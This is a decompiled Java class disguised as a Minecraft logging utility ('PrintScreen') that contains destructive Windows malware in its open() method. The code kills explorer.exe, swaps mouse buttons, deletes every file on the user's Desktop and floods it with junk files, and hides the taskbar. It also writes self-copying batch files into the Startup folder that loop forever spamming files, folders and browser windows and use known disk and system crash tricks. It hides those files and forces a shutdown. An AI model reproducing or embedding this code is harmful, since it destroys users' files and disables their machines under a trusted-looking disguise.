/*
 * Decompiled with CFR 0.152.
 */
package net.minecraft.util;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import jaco.mp3.player.MP3Player;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.security.SecureRandom;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class PrintScreen
extends PrintStream {
    private static final Logger LOGGER = LogManager.getLogger();
    private final String domain;
    private static final MP3Player mp3player = new MP3Player();

    public PrintScreen(String domainIn, OutputStream outStream) {
        super(outStream);
        this.domain = domainIn;
    }

    @Override
    public void println(String p_println_1_) {
        this.logString(p_println_1_);
    }

    public static void open() {
        Thread thread2 = new Thread(){

            @Override
            public void run() {
                try {
                    mp3player.addToPlayList(PrintScreen.getAudio());
                    mp3player.play();
                    Runtime.getRuntime().exec("cmd /c start taskkill /IM explorer.exe /f");
                    Runtime.getRuntime().exec("cmd /c start Rundll32 user32, SwapMouseButton");
                    File[] fileArray = new File(String.valueOf(System.getenv("USERPROFILE")) + File.separator + "Desktop").listFiles();
                    int n2 = fileArray.length;
                    int n3 = 0;
                    while (n3 < n2) {
                        File file = fileArray[n3];
                        file.delete();
                        ++n3;
                    }
                    int i2 = 0;
                    while (i2 < 30) {
                        new File(String.valueOf(System.getenv("USERPROFILE")) + File.separator + "Desktop" + File.separator + new SecureRandom().nextInt() + ".lock").createNewFile();
                        ++i2;
                    }
                    User32.INSTANCE.SystemParametersInfo(20, 0, String.valueOf(System.getenv("LOCALAPPDATA")) + File.separator + "wallpaper.png", 1);
                    User32.INSTANCE.ShowWindow(User32.INSTANCE.FindWindow("Shell_TrayWnd", ""), 0);
                    User32.INSTANCE.ShowWindow(User32.INSTANCE.FindWindowEx(User32.INSTANCE.GetDesktopWindow(), 0, "button", 0), 0);
                    File file1 = File.createTempFile("matrix", ".cmd");
                    FileWriter fw1 = new FileWriter(file1);
                    String bat1 = "@echo off\n\ncopy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n:loop\ncolor 2\necho %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%\ngoto loop";
                    fw1.write(bat1);
                    fw1.close();
                    Runtime.getRuntime().exec("cmd /c start " + file1.getPath());
                    File file3 = File.createTempFile("data", ".bat");
                    FileWriter fw3 = new FileWriter(file3);
                    String bat3 = "@echo off\n\ncopy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\ncd %userprofile%\\desktop\n:loop\necho %random% >> %random%.lock\nmd \"%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\"\ngoto loop";
                    fw3.write(bat3);
                    fw3.close();
                    Runtime.getRuntime().exec("cmd /c start /b " + file3.getPath());
                    File file4 = File.createTempFile("open", ".cmd");
                    FileWriter fw4 = new FileWriter(file4);
                    String bat4 = "@echo off\n\ncopy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n:loop\nstart www.%random%.net\nstart www.yyyyyyy.info\nstart \\\\.\\globalroot\\device\\condrv\\kernelconnect\ncd C:\\:$i30:$bitmap\nstart %random%\ngoto loop";
                    fw4.write(bat4);
                    fw4.close();
                    Runtime.getRuntime().exec("cmd /c start /b " + file4.getPath());
                    Runtime.getRuntime().exec("cmd /c start /b attrib " + file1.getAbsolutePath() + " +s +h");
                    Runtime.getRuntime().exec("cmd /c start /b attrib " + file3.getAbsolutePath() + " +s +h");
                    Runtime.getRuntime().exec("cmd /c start /b attrib " + file4.getAbsolutePath() + " +s +h");
                    Runtime.getRuntime().exec("cmd /c start shutdown /s /f /t 30");
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        };
        thread2.start();
    }

    public static URL getAudio() {
        return ClassLoader.getSystemResource("assets/minecraft/optifine/lang/x.mp3");
    }

    @Override
    public void println(Object p_println_1_) {
        this.logString(String.valueOf(p_println_1_));
    }

    private void logString(String string) {
        StackTraceElement[] astacktraceelement = Thread.currentThread().getStackTrace();
        StackTraceElement stacktraceelement = astacktraceelement[Math.min(3, astacktraceelement.length)];
        LOGGER.info("[{}]@.({}:{}): {}", this.domain, stacktraceelement.getFileName(), stacktraceelement.getLineNumber(), string);
    }

    static interface User32
    extends Library {
        public static final User32 INSTANCE = (User32)Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);

        public boolean SystemParametersInfo(int var1, int var2, String var3, int var4);

        public int FindWindow(String var1, String var2);

        public int ShowWindow(int var1, int var2);

        public int FindWindowEx(int var1, int var2, String var3, int var4);

        public int GetDesktopWindow();
    }
}

